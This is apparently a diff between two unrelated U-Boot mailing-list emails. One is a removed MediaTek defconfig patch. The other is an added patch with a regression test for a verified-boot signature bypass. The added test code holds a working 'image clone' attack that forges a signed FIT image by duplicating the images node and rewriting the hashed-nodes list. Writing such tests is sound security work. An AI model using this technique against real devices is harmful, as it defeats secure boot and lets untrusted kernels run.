@@ -4,105 +4,79 @@ X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
 Received: from phobos.denx.de (phobos.denx.de [85.214.62.61])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.lore.kernel.org (Postfix) with ESMTPS id E6F7A10775E7
-	for <u-boot@archiver.kernel.org>; Wed, 18 Mar 2026 16:52:18 +0000 (UTC)
+	by smtp.lore.kernel.org (Postfix) with ESMTPS id 8880110775E4
+	for <u-boot@archiver.kernel.org>; Wed, 18 Mar 2026 17:02:42 +0000 (UTC)
 Received: from h2850616.stratoserver.net (localhost [IPv6:::1])
-	by phobos.denx.de (Postfix) with ESMTP id EDD4483F93;
-	Wed, 18 Mar 2026 17:51:09 +0100 (CET)
-Authentication-Results: phobos.denx.de; dmarc=none (p=none dis=none) header.from=baylibre.com
+	by phobos.denx.de (Postfix) with ESMTP id C730883A41;
+	Wed, 18 Mar 2026 18:02:40 +0100 (CET)
+Authentication-Results: phobos.denx.de; dmarc=pass (p=none dis=none) header.from=konsulko.com
 Authentication-Results: phobos.denx.de; spf=pass smtp.mailfrom=u-boot-bounces@lists.denx.de
 Authentication-Results: phobos.denx.de;
-	dkim=pass (2048-bit key; unprotected) header.d=baylibre-com.20230601.gappssmtp.com header.i=@baylibre-com.20230601.gappssmtp.com header.b="j8QMzOMk";
+	dkim=pass (1024-bit key; unprotected) header.d=konsulko.com header.i=@konsulko.com header.b="fKd3SBbu";
 	dkim-atps=neutral
 Received: by phobos.denx.de (Postfix, from userid 109)
- id 8C2068352B; Wed, 18 Mar 2026 17:51:04 +0100 (CET)
-Received: from mail-wm1-x32d.google.com (mail-wm1-x32d.google.com
- [IPv6:2a00:1450:4864:20::32d])
+ id 1170283AC5; Wed, 18 Mar 2026 18:02:40 +0100 (CET)
+Received: from mail-oo1-xc2b.google.com (mail-oo1-xc2b.google.com
+ [IPv6:2607:f8b0:4864:20::c2b])
  (using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits))
  (No client certificate requested)
- by phobos.denx.de (Postfix) with ESMTPS id 46FC183FD3
- for <u-boot@lists.denx.de>; Wed, 18 Mar 2026 17:51:02 +0100 (CET)
+ by phobos.denx.de (Postfix) with ESMTPS id B3668839DF
+ for <u-boot@lists.denx.de>; Wed, 18 Mar 2026 18:02:37 +0100 (CET)
 Authentication-Results: phobos.denx.de;
- dmarc=none (p=none dis=none) header.from=baylibre.com
+ dmarc=pass (p=none dis=none) header.from=konsulko.com
 Authentication-Results: phobos.denx.de;
- spf=pass smtp.mailfrom=jstephan@baylibre.com
-Received: by mail-wm1-x32d.google.com with SMTP id
- 5b1f17b1804b1-48334ee0aeaso642465e9.1
- for <u-boot@lists.denx.de>; Wed, 18 Mar 2026 09:51:02 -0700 (PDT)
+ spf=pass smtp.mailfrom=trini@konsulko.com
+Received: by mail-oo1-xc2b.google.com with SMTP id
+ 006d021491bc7-67badf2d5b6so65896eaf.2
+ for <u-boot@lists.denx.de>; Wed, 18 Mar 2026 10:02:37 -0700 (PDT)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
- d=baylibre-com.20230601.gappssmtp.com; s=20230601; t=1773852661; x=1774457461;
- darn=lists.denx.de; 
- h=cc:to:in-reply-to:references:message-id:content-transfer-encoding
- :mime-version:subject:date:from:from:to:cc:subject:date:message-id
- :reply-to; bh=JSb+1mk7holnrE2f1j0Uovqy02Xk34hbnPJu157sB6U=;
- b=j8QMzOMkHtgMVjaoxJgmM+odEi3LNl78WmpspvJfg9MzbUadeJ6Hl94XxG70uuRJoV
- jtsAIY76v1cXfTZaO5zpplH+mCWb0yo7aZqhPiP2ePUHUqMYR7NpgTKSThaLHF1+jZ8Z
- uXCafdU7ZGLu3M4Nqy+qJ50IO4qtu91DstAGCazak3SILe53x9vi13ZNk/cVlP5M86nq
- +Q/Ea1bQRwSuV6iwP0NOAss1Q9v5ldox/HPxOutmvpg5jtWcl3gCmV5k7jcyxSrnft9C
- rNGuVzt4vXEs63iUvhLrBzp2rjj60oz2KYBQWIN1GSPwcEqlKc3uEAXeVTl8+az8++ZA
- R97w==
+ d=konsulko.com; s=google; t=1773853356; x=1774458156; darn=lists.denx.de;
+ h=content-transfer-encoding:mime-version:message-id:date:subject:to
+ :from:from:to:cc:subject:date:message-id:reply-to;
+ bh=IsNOtCaUBamZp5UbH49ZhKbaDBEtOgslWsd07QfTAgs=;
+ b=fKd3SBbutwkkqImClFTkjLSkS3IPteA7Xq+0lO0m/pqX0kHcZwKJztwCu34Pq8i3gM
+ wrWGRdw5/0uKHAYnH3AAFR1PwoWi7r1MrVvB7h8WiBZfakiDDciIqXJtOJYVbLJ3ba8+
+ KS6mTvODHwu0GDN28p3ZAXuTdvqCIxBd2D8GM=
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
- d=1e100.net; s=20251104; t=1773852661; x=1774457461;
- h=cc:to:in-reply-to:references:message-id:content-transfer-encoding
- :mime-version:subject:date:from:x-gm-gg:x-gm-message-state:from:to
- :cc:subject:date:message-id:reply-to;
- bh=JSb+1mk7holnrE2f1j0Uovqy02Xk34hbnPJu157sB6U=;
- b=Wj0BfETYkDmflSfrBnm0aj4bM/fO7Tf0aQRDq7Kd8TvrxAmsLvOQiddt6IkhzXI1fS
- o4d2NA1Drcj7D1fVuGGgHOLCshmgf3YfyB8oTJXpZIpHz0xPXYU5rcWG5ItKDwMLA+ca
- Ij/G3gIZZXxJLzZi/kVQ/4fCs002oYaEls1b9j8ol3Nc01VsDJXkGDTImsOZ8efneAaQ
- HIlGup8TYiScdmr1d7wqxgzR8b6RjWodrSFjKjuV04tpdn1zGCPPIhHd1MjIjptZhdnm
- sERSdv8mdgOCcbxKK5Oold2u9zNeGvrNadPyeH97NmzOzf626o1jeBwzjbyxwwRKdTmE
- sUEw==
-X-Gm-Message-State: AOJu0YwH/kx5jsPeTbSQRIhQRvWf83lRCfJqnM44aUne6d0KgOTbBfxI
- xrXf2iQSpkyKUD8TNDA9fDfVUdIRsk74ET19Uv/jx+U0+P65Un9RNULlCLtAgikiDoU=
-X-Gm-Gg: ATEYQzx2E20HTyNcayk3GxX/ynY+4TBCLHafQp1TUEKRQD5qJWHm0ePq0oeyDMXK3pB
- sogJje0QPJst9m/PK9rhJq2sRmeXbPHuvIqt64+NB3BQ+C/+Pp48irDY4xmG4YmmyxL8+/gC/mj
- NUXDRsBIyYfTGEdDmMc8IhjZTDZ9m2q4ghoic7JfQFqkDsumzW2d5qalfBQO4tsZtRY0qGGukpl
- 6jgQKGwM8VpnBgokwUmp+P/n8ORg6JPk+rwCdelpRg+DmcoLn0YW4PX1ELPvGcJYbI61skChggz
- Ide0M3WP18uMayipnkvvgAZNL9jE6bvY243mDNPAqij8VSAjy7qUmK5gUvlQ5Fa+g4ZqOc12Kct
- XvilcNIWZX1/+HXmvShcueOzjVsmUpJuJHpMvN5M4+/9zhWyX0CUklP/Ox746TQ96rYrK579+fO
- 8UddlluLG8np0tNm8niJGOEbF3nCOkFZ7PxeOuXgKEEGU3sD0+jZDazzs99iZGFwJheElvtPfn2
- qn4gWGi593pDIGst0vDa1DupjekBJeTYN7vTGqKT9Ko3Yfa979Fn1C14A8xB20kyieo2qqPYbU0
- Wk8qyDVJZlqLTtWWGQ==
-X-Received: by 2002:a05:600c:310d:b0:485:364e:934e with SMTP id
- 5b1f17b1804b1-486f457284bmr65672945e9.21.1773852661146; 
- Wed, 18 Mar 2026 09:51:01 -0700 (PDT)
-Received: from [192.168.1.100]
- (2a02-842a-d52e-6101-b535-6f9c-731f-0b89.rev.sfr.net.
- [2a02:842a:d52e:6101:b535:6f9c:731f:b89])
- by smtp.gmail.com with ESMTPSA id
- ffacd0b85a97d-43b51892290sm8639527f8f.20.2026.03.18.09.51.00
+ d=1e100.net; s=20251104; t=1773853356; x=1774458156;
+ h=content-transfer-encoding:mime-version:message-id:date:subject:to
+ :from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date:message-id
+ :reply-to;
+ bh=IsNOtCaUBamZp5UbH49ZhKbaDBEtOgslWsd07QfTAgs=;
+ b=VDGlAxVbUUZzeFixTgy+Mq3RMnKAopT8241CWYbTlyCRkjI4eiq0VfBY6pnB+n6euh
+ yA0XN0SvpI+ixLr/YAhd7jsFEKMpkoDtQpNXFjIAL2wIHek8NgWXbxoG2yj6m9BPJPou
+ ZvIH1XeqvABXDBSmqlDT62R/3WWAyTdjOO/SQciJXvHCBszbOB/D4oHeG6xPkFdTU3qT
+ f025R7StlwnHH7UokU5bYhOxuZkemceuLdDKsrGJX36gsG9gsruXBhmqRQgDJUXNpBPe
+ JLSD82LYe6WjBdSiH+QrWL4DYdEpRg2u8pmABpVXkZGwOSscEtNR/aiMLAUerDciBbgW
+ uwBA==
+X-Gm-Message-State: AOJu0YxNSxMmql8gnr2MirpD9jv1rUErRcddP1clSuNXoEi663xL68qo
+ J/f+H6zGj2dAHoHZttsrkJc70Z7FwsMSbJ/rlseoEN8Ml2mMn+hj76Z0DXvCZB0lWTZgE7mElFj
+ XhY/F
+X-Gm-Gg: ATEYQzyKGxTYTEgSlVZl9yMmsN5vjcDM5R23elSabJjjkArKxZlBsz91vpMhEEH3oBn
+ 5jq3ij/FSFpzbcuESGg7bbqZa5i1Y4mR6PihJwDRHJakNJ2HXktWuJGyxBUe2f04RmTVgJLGkmm
+ hQOn1DN/RJEc4kCIhSwtQy4Ayq34wB8KccCsdqK3cBk+iY4wUzcSh8uzLtesWL4ztMvveM4vT//
+ akaVgMC/lSvm8X97qhJsuiHnBosXTdhJ0uAEQmjxhdRiLsRHn5AQXh3MH8SrlslGwiG4lOMFSaL
+ mgQFz0cOWpYtadF9I8qV9ATSQbdfSA/MtYeXET+dX1yp62n8o62ZxhxRAFlwbt56HqO6nK3xgBg
+ Uaqf6aWRUPBKq5kvfi5fZwpx9cJyrsCQVh/7zzzXobqQgeMjLrxWsK1cJVuh4UX/fu07MBlkSLc
+ b17+k+/mop9uMAF9j6KCz3euP6tiuLR278wUNhrNG5AZTWeUw+4SIlmQ2dcpKdZU1qMMgNUofAw
+ N4ITgrtfyqYKFb6/M0eQiRHoyBBpgG9V+Juu8FkaKJ9vR8K2wU=
+X-Received: by 2002:a05:6820:1993:b0:67b:bf52:998e with SMTP id
+ 006d021491bc7-67c0dae2cc6mr3010072eaf.36.1773853356014; 
+ Wed, 18 Mar 2026 10:02:36 -0700 (PDT)
+Received: from bill-the-cat.. (fixed-189-203-97-235.totalplay.net.
+ [189.203.97.235]) by smtp.gmail.com with ESMTPSA id
+ 006d021491bc7-67c0d89ca52sm1973431eaf.12.2026.03.18.10.02.34
+ for <u-boot@lists.denx.de>
  (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
- Wed, 18 Mar 2026 09:51:00 -0700 (PDT)
-From: Julien Stephan <jstephan@baylibre.com>
-Date: Wed, 18 Mar 2026 17:51:01 +0100
-Subject: [PATCH v2 9/9] configs: add new defconfig for
- mt8395_genio_1200_evk_ufs
-MIME-Version: 1.0
-Content-Type: text/plain; charset="utf-8"
-Content-Transfer-Encoding: 7bit
-Message-Id: <20260318-mt8195-add-ufs-support-v2-9-f18eeeeb0e72@baylibre.com>
-References: <20260318-mt8195-add-ufs-support-v2-0-f18eeeeb0e72@baylibre.com>
-In-Reply-To: <20260318-mt8195-add-ufs-support-v2-0-f18eeeeb0e72@baylibre.com>
+ Wed, 18 Mar 2026 10:02:35 -0700 (PDT)
+From: Tom Rini <trini@konsulko.com>
 To: u-boot@lists.denx.de
-Cc: GSS_MTK_Uboot_upstream <GSS_MTK_Uboot_upstream@mediatek.com>, 
- Ryder Lee <ryder.lee@mediatek.com>, Weijie Gao <weijie.gao@mediatek.com>, 
- Chunfeng Yun <chunfeng.yun@mediatek.com>, 
- Igor Belwon <igor.belwon@mentallysanemainliners.org>, 
- Jaehoon Chung <jh80.chung@samsung.com>, Peng Fan <peng.fan@nxp.com>, 
- Tom Rini <trini@konsulko.com>, David Lechner <dlechner@baylibre.com>, 
- Macpaul Lin <macpaul.lin@mediatek.com>, 
- Julien Masson <jmasson@baylibre.com>, 
- Neil Armstrong <neil.armstrong@linaro.org>, 
- Bhupesh Sharma <bhupesh.linux@gmail.com>, 
- Neha Malcom Francis <n-francis@ti.com>, 
- Marek Vasut <marek.vasut+renesas@mailbox.org>, 
- Mattijs Korpershoek <mkorpershoek@kernel.org>, 
- Chris-QJ Chen <chris-qj.chen@mediatek.com>, 
- Sam Protsenko <semen.protsenko@linaro.org>, 
- Bo-Chen Chen <rex-bc.chen@mediatek.com>, 
- Julien Stephan <jstephan@baylibre.com>
-X-Mailer: b4 0.14.3
+Subject: [PATCH] tests: FIT: Add "clone" image attack image test
+Date: Wed, 18 Mar 2026 11:02:33 -0600
+Message-ID: <20260318170233.1200532-1-trini@konsulko.com>
+X-Mailer: git-send-email 2.43.0
+MIME-Version: 1.0
+Content-Transfer-Encoding: 8bit
 X-BeenThere: u-boot@lists.denx.de
 X-Mailman-Version: 2.1.39
 Precedence: list
@@ -119,117 +93,138 @@ Sender: "U-Boot" <u-boot-bounces@lists.denx.de>
 X-Virus-Scanned: clamav-milter 0.103.8 at phobos.denx.de
 X-Virus-Status: Clean
 
-This new defconfig is based on mt8395_genio_1200_evk_defconfig, with
-additional configs for UFS.  In order to avoid duplicating defconfig, we
-introduce configs/mt8195.config.
+Related to the problem resolved with commit 2092322b31cc ("boot: Add
+fit_config_get_hash_list() to build signed node list"), add a testcase
+for the problem as well.
 
-Signed-off-by: Julien Stephan <jstephan@baylibre.com>
+Reported-by: Apple Security Engineering and Architecture (SEAR)
+Signed-off-by: Tom Rini <trini@konsulko.com>
 ---
- board/mediatek/MAINTAINERS                  |  4 +++-
- configs/mt8195.config                       | 24 ++++++++++++++++++++++++
- configs/mt8395_genio_1200_evk_defconfig     | 26 ++------------------------
- configs/mt8395_genio_1200_evk_ufs_defconfig | 13 +++++++++++++
- 4 files changed, 42 insertions(+), 25 deletions(-)
+Apple has confirmed that we can include the test case now, rather than
+waiting.
+---
+ test/py/tests/test_vboot.py | 10 ++++++
+ test/py/tests/vboot_evil.py | 65 +++++++++++++++++++++++++++++++++++++
+ 2 files changed, 75 insertions(+)
 
-diff --git a/board/mediatek/MAINTAINERS b/board/mediatek/MAINTAINERS
-index 08cbd2ce49f..621d613c9fb 100644
---- a/board/mediatek/MAINTAINERS
-+++ b/board/mediatek/MAINTAINERS
-@@ -11,8 +11,10 @@ F:	configs/mt8188.config
- F:	configs/mt8370_genio_510_evk_defconfig
- F:	configs/mt8390_genio_700_evk_defconfig
+diff --git a/test/py/tests/test_vboot.py b/test/py/tests/test_vboot.py
+index 19f3f981379e..55518bed07e9 100644
+--- a/test/py/tests/test_vboot.py
++++ b/test/py/tests/test_vboot.py
+@@ -372,6 +372,16 @@ def test_vboot(ubman, name, sha_algo, padding, sign_options, required,
+             msg = 'Signature checking prevents use of unit addresses (@) in nodes'
+             run_bootm(sha_algo, 'evil kernel@', msg, False, efit)
  
--MT8395
-+MT8195/MT8395
- M:	Macpaul Lin <Macpaul.Lin@mediatek.com>
- M:	Julien Stephan <jstephan@baylibre.com>
- S:	Maintained
-+F:	configs/mt8195.config
- F:	configs/mt8395_genio_1200_evk_defconfig
-+F:	configs/mt8395_genio_1200_evk_ufs_defconfig
-diff --git a/configs/mt8195.config b/configs/mt8195.config
-new file mode 100644
-index 00000000000..b5bc1848977
---- /dev/null
-+++ b/configs/mt8195.config
-@@ -0,0 +1,24 @@
-+CONFIG_ARM=y
-+CONFIG_COUNTER_FREQUENCY=13000000
-+CONFIG_POSITION_INDEPENDENT=y
-+CONFIG_ARCH_MEDIATEK=y
-+CONFIG_TEXT_BASE=0x4c000000
-+CONFIG_NR_DRAM_BANKS=1
-+CONFIG_TARGET_MT8195=y
-+CONFIG_SYS_LOAD_ADDR=0x60000000
-+# CONFIG_BOARD_INIT is not set
-+CONFIG_CMD_CLK=y
-+CONFIG_CMD_GPT=y
-+CONFIG_CMD_MMC=y
-+CONFIG_CMD_PART=y
-+CONFIG_OF_UPSTREAM=y
-+CONFIG_CLK=y
-+CONFIG_MMC_MTK=y
-+CONFIG_PINCTRL=y
-+CONFIG_PINCONF=y
-+CONFIG_PINCTRL_MT8195=y
-+CONFIG_BAUDRATE=921600
-+CONFIG_DM_SERIAL=y
-+CONFIG_MTK_SERIAL=y
-+CONFIG_WDT=y
-+CONFIG_WDT_MTK=y
-diff --git a/configs/mt8395_genio_1200_evk_defconfig b/configs/mt8395_genio_1200_evk_defconfig
-index 2d73af353f7..47c10757c52 100644
---- a/configs/mt8395_genio_1200_evk_defconfig
-+++ b/configs/mt8395_genio_1200_evk_defconfig
-@@ -1,26 +1,4 @@
--CONFIG_ARM=y
--CONFIG_COUNTER_FREQUENCY=13000000
--CONFIG_POSITION_INDEPENDENT=y
--CONFIG_ARCH_MEDIATEK=y
--CONFIG_TEXT_BASE=0x4c000000
--CONFIG_NR_DRAM_BANKS=1
-+#include <configs/mt8195.config>
++            # Try doing a clone of the images
++            efit = '%stest.evilclone.fit' % tmpdir
++            shutil.copyfile(fit, efit)
++            vboot_evil.add_evil_node(fit, efit, evil_kernel, 'clone')
 +
- CONFIG_DEFAULT_DEVICE_TREE="mediatek/mt8395-genio-1200-evk"
--CONFIG_TARGET_MT8195=y
--CONFIG_SYS_LOAD_ADDR=0x60000000
- CONFIG_IDENT_STRING="mt8395-genio-1200-evk"
--# CONFIG_BOARD_INIT is not set
--CONFIG_CMD_CLK=y
--CONFIG_CMD_GPT=y
--CONFIG_CMD_MMC=y
--CONFIG_CMD_PART=y
--CONFIG_OF_UPSTREAM=y
--CONFIG_CLK=y
--CONFIG_MMC_MTK=y
--CONFIG_PINCTRL=y
--CONFIG_PINCONF=y
--CONFIG_PINCTRL_MT8195=y
--CONFIG_BAUDRATE=921600
--CONFIG_DM_SERIAL=y
--CONFIG_MTK_SERIAL=y
--CONFIG_WDT=y
--CONFIG_WDT_MTK=y
-diff --git a/configs/mt8395_genio_1200_evk_ufs_defconfig b/configs/mt8395_genio_1200_evk_ufs_defconfig
-new file mode 100644
-index 00000000000..c18d7de4df2
---- /dev/null
-+++ b/configs/mt8395_genio_1200_evk_ufs_defconfig
-@@ -0,0 +1,13 @@
-+#include <configs/mt8195.config>
++            utils.run_and_log_expect_exception(
++                ubman, [fit_check_sign, '-f', efit, '-k', dtb],
++                1, 'Failed to verify required signature')
++            run_bootm(sha_algo, 'evil clone', 'Bad Data Hash', False, efit)
 +
-+CONFIG_DEFAULT_DEVICE_TREE="mediatek/mt8395-genio-1200-evk-ufs"
-+CONFIG_IDENT_STRING=" mt8395-genio-1200-evk-ufs"
-+CONFIG_CMD_UFS=y
-+CONFIG_PHY=y
-+CONFIG_DM_PMIC=y
-+CONFIG_DM_PMIC_MTK_PWRAP=y
-+CONFIG_DM_REGULATOR=y
-+CONFIG_DM_REGULATOR_MT6359=y
-+CONFIG_SCSI=y
-+CONFIG_UFS=y
-+CONFIG_UFS_MEDIATEK=y
-
+         # Create a new properly signed fit and replace header bytes
+         make_fit('sign-configs-%s%s.its' % (sha_algo, padding), ubman, mkimage, dtc_args, datadir, fit)
+         sign_fit(sha_algo, sign_options)
+diff --git a/test/py/tests/vboot_evil.py b/test/py/tests/vboot_evil.py
+index e2b0cd65468b..5720631ae522 100644
+--- a/test/py/tests/vboot_evil.py
++++ b/test/py/tests/vboot_evil.py
+@@ -14,6 +14,7 @@ FDT_END = 0x9
+ 
+ FAKE_ROOT_ATTACK = 0
+ KERNEL_AT = 1
++IMAGE_CLONE = 2
+ 
+ MAGIC = 0xd00dfeed
+ 
+@@ -274,6 +275,66 @@ def get_prop_value(dt_struct, dt_strings, prop_path):
+ 
+     return tag_data
+ 
++def image_clone_attack(dt_struct, dt_strings, kernel_content, kernel_hash):
++    # retrieve the default configuration name
++    default_conf_name = get_prop_value(
++        dt_struct, dt_strings, '/configurations/default')
++    default_conf_name = str(default_conf_name[:-1], 'utf-8')
++
++    conf_path = '/configurations/' + default_conf_name
++
++    # fetch the loaded kernel name from the default configuration
++    loaded_kernel = get_prop_value(dt_struct, dt_strings, conf_path + '/kernel')
++
++    loaded_kernel = str(loaded_kernel[:-1], 'utf-8')
++
++    # since this is the last child in images!
++    loaded_fdt_name = get_prop_value(dt_struct, dt_strings, conf_path + '/fdt')
++
++    loaded_fdt_name = str(loaded_fdt_name[:-1], 'utf-8')
++
++     # determine boundaries of the images
++    (img_node_start, img_node_end) = (determine_offset(
++        dt_struct, dt_strings, '/images'))
++    if img_node_start is None and img_node_end is None:
++        print('Fatal error, unable to find images node')
++        sys.exit()
++
++    # copy the images node
++    img_node_copy = dt_struct[img_node_start:img_node_end]
++
++    # create an additional empty node
++    empty_node = struct.pack('>I', FDT_BEGIN_NODE) + b"EMPTYNO\0" + struct.pack('>I', FDT_END_NODE)
++    # right before the end, we add it!
++    img_node_copy = img_node_copy[:-4] + empty_node + img_node_copy[-4:]
++
++    # insert the copy inside the tree
++    dt_struct = dt_struct[:img_node_end-4] + \
++        img_node_copy + empty_node + dt_struct[img_node_end-4:]
++
++    # change the content of the kernel being loaded
++    dt_struct = change_property_value(
++        dt_struct, dt_strings, '/images/' + loaded_kernel + '/data', kernel_content)
++
++    # change the content of the kernel being loaded
++    dt_struct = change_property_value(
++        dt_struct, dt_strings, '/images/' + loaded_kernel + '/hash-1/value', kernel_hash)
++
++    # finally, the main bug: change the hashed nodes to use the images clone instead!
++    hashed_nodes: bytes = get_prop_value(dt_struct, dt_strings, conf_path + '/signature/hashed-nodes')
++    print(f"got hashed nodes: {hashed_nodes}")
++    nodes = hashed_nodes.split(b"\0")
++    patched_nodes = []
++    for node in nodes:
++        new_node = node
++        if node.startswith(b"/images/"):
++            # reparent the node
++            new_node = b"/images" + node
++        patched_nodes.append(new_node)
++    hashed_nodes = b"\0".join(patched_nodes)
++    dt_struct = change_property_value(
++        dt_struct, dt_strings, conf_path + '/signature/hashed-nodes', hashed_nodes)
++    return dt_struct
+ 
+ def kernel_at_attack(dt_struct, dt_strings, kernel_content, kernel_hash):
+     """Conduct the kernel@ attack
+@@ -419,6 +480,8 @@ def add_evil_node(in_fname, out_fname, kernel_fname, attack):
+         attack = FAKE_ROOT_ATTACK
+     elif attack == 'kernel@':
+         attack = KERNEL_AT
++    elif attack == 'clone':
++        attack = IMAGE_CLONE
+     else:
+         raise ValueError('Unknown attack name!')
+ 
+@@ -455,6 +518,8 @@ def add_evil_node(in_fname, out_fname, kernel_fname, attack):
+     elif attack == KERNEL_AT:
+         dt_struct = kernel_at_attack(dt_struct, dt_strings, kernel_content,
+                                      hash_digest)
++    elif attack == IMAGE_CLONE:
++        dt_struct = image_clone_attack(dt_struct, dt_strings, kernel_content, hash_digest)
+ 
+     # now rebuild the new file
+     size_dt_strings = len(dt_strings)
 -- 
-2.52.0
+2.43.0
 
